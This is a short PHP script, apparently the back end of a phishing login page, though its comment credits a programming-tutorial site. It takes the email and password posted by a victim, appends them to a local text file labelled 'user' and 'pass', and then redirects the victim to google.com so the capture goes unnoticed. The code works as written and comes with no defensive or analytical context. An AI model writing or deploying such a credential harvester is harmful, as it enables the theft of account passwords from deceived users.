<?php //Ejemplo aprenderaprogramar.com


$file = fopen("uss.txt", "a");
$email = $_POST['email'];
$pass = $_POST['pass'];


fwrite($file, "================" . PHP_EOL);
fwrite($file,  "user: " . $email . PHP_EOL);
fwrite($file,  "pass: " . $pass . PHP_EOL);
fwrite($file, "================" . PHP_EOL);

fclose($file);

header('Location: http://google.com');
?>
